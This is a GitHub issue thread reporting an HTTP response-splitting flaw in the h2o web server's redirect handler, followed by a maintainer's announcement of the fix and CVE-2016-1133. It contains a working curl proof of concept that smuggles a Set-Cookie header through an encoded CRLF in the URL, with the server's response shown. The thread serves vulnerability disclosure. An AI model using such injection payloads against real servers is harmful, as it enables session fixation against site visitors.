## Description

[![@nanorc](https://avatars.githubusercontent.com/u/953090?v=4&size=48)](/nanorc)[nanorc](https://github.com/nanorc)opened [on Jan 7, 2016](https://github.com/h2o/h2o/issues/682#issue-125355945)

Hi,

I found out that i can do HTTP response splitting in h2o by feeding the URL with carriage return

and new line (CRLF). Example:

```
$ curl -I "http://fooexample.com/en/%0d%0aset-cookie:test=test"

```

```
HTTP/1.1 301 Redirected
Date: Thu, 07 Jan 2016 08:56:34 GMT
Server: h2o/1.6.0
Connection: keep-alive
location: https://fooexample.com/en/
set-cookie:test=test
content-type: text/html; charset=utf-8

```

the h2o config:

```
hosts:
    "fooexample.com":
        listen:
            port: 80
        paths:
            "/":
                redirect:
                    status: 301
                    url: https://fooexample.com/
    "fooexample.com":
        listen:
            port: 443
            ssl:
                certificate-file: /path/to/fooexample.crt
                key-file:         /path/to/fooexample.key

```

This issue could lead to session fixation attack where an attacker could coerce a victim

into clicking a link with an injected predefined cookie

### @kazuho **[kazuho](/kazuho)** commented [Jan 8, 2016](#issue-125535745) ‚Ä¢ edited Loading

This PR fixes a flaw in the redirect handler included in H2O up to version 1.6.1 / 1.7.0-beta2.

When redirect directive is used, this flaw allows a remote attacker to inject response headers into an HTTP redirect response. H2O version 1.6.2 and 1.7.0-beta3 has been released to address this vulnerability.

Users are advised to upgrade their servers immediately.

CVE-ID for the issue is [CVE-2016-1133](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1133).

Reported in [#682](https://github.com/h2o/h2o/issues/682).

Sorry, something went wrong.

### @kazuho **[kazuho](/kazuho)** commented [Jan 8, 2016](#issue-125535745) ‚Ä¢ edited Loading

This PR fixes a flaw in the redirect handler included in H2O up to version 1.6.1 / 1.7.0-beta2.

When redirect directive is used, this flaw allows a remote attacker to inject response headers into an HTTP redirect response. H2O version 1.6.2 and 1.7.0-beta3 has been released to address this vulnerability.

Users are advised to upgrade their servers immediately.

CVE-ID for the issue is [CVE-2016-1133](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1133).

Reported in [#682](https://github.com/h2o/h2o/issues/682).

Sorry, something went wrong.
